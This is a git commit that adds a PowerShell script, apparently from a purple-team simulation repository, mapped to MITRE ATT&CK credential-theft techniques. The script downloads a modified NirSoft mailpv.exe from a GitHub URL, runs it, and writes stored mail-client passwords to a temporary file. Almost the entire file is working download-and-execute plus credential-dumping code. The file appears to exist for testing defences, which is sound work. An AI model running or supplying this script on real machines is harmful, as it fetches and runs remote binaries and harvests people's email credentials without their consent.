8274f4486542548c1429175b3a9d6fea85b679e3
mthcht <mathieuchotplassot@gmail.com>
2023-01-25 09:37:30 +0100

    Create get_stored_mail_passwords_with_mailpv.ps1

---
+++ Simulation/Windows/System/get_stored_mail_passwords_with_mailpv.ps1
@@ -0,0 +1,31 @@
+<#
+    T1588.002 - Obtain Capabilities: Tool
+    T1555 - Credentials from Password Stores
+    T1114.001 - Email Collection: Local Email Collection
+    Extract passwords from some mail client with Nirsoft tool mailpv.exe
+    Download  mailpv.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/mailpv.exe and execute it 
+#>
+
+# Download and execute mailpv.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
+$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/mailpv.exe"
+$dumpfile = "$env:tmp\mailpasswords.txt"
+$outfile = "$env:tmp\mailpass.exe"
+try {
+    Invoke-WebRequest $url -OutFile $outfile 
+    if (Test-Path $outfile){
+        Write-Host -ForegroundColor Green "Success: mailpv.exe downloaded to $outfile"
+        & $outfile /stext $dumpfile
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: Failed to download mailpv.exe, $dumpfile not found."
+    }
+    if(test-path $dumpfile){
+        Write-Host -ForegroundColor Green "Success: Mail passwords extracted to $dumpfile"
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: Failed to extract Mail passwords to $dumpfile"
+    }
+}
+catch {
+    Write-Host -ForegroundColor Red "Erorr: $_"
+}
